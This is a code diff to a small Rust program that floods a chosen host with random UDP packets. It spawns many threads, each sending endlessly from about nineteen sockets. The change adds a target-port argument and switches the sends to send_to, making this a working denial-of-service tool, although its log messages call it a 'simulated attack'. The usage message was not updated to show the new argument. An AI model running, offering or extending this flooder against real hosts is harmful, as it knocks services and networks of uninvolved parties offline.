@@ -6,10 +6,9 @@ use std::time;
 
 use rand::Rng;
 
-fn new_socket(host: &str, port: u32) -> UdpSocket {
+fn new_socket(port: u32) -> UdpSocket {
     let socket = UdpSocket::bind(format!("0.0.0.0:{}", port)).unwrap();
 
-    socket.connect(host).unwrap();
     return socket;
 }
 
@@ -27,25 +26,26 @@ fn main() {
         let num_threads = args[2].to_string().parse::<i32>().unwrap();
         let time = args[3].to_string().parse::<u64>().unwrap();
         let host = args[1].to_string();
+        let target_port = args[4].to_string().parse::<u32>().unwrap();
         let mut port: u32 = 40000;
         log("Starting threads...");
         for thread_num in 1..num_threads + 1 {
             port = port.clone() + 30;
-            let host = format!("{}:{}", host.clone(), port);
+            let target_host = format!("{}:{}", host.clone(), target_port.clone());
             thread::spawn(move || {
                 log(format!("Starting simulated attack on thread {}...", thread_num).as_str());
                 let mut port = port.clone() + 1;
                 let mut socket_list = Vec::new();
                 for _ in 1..20 {
                     port = port.clone() + 1;
-                    let socket = new_socket(host.as_str(), port);
+                    let socket = new_socket(port);
                     socket_list.push(socket);
                 }
 
                 let msg = rand::thread_rng().gen::<[u8; 32]>();
                 loop {
                     for socket in &socket_list {
-                        socket.send(&msg).unwrap();
+                        socket.send_to(&msg, target_host.clone()).unwrap();
                     }
                 }
             });
@@ -61,4 +61,4 @@ fn main() {
     } else {
         log(&*format!("{} ip number_of_threads time(0 for infinite)", args[0]))
     }
-}	
+}
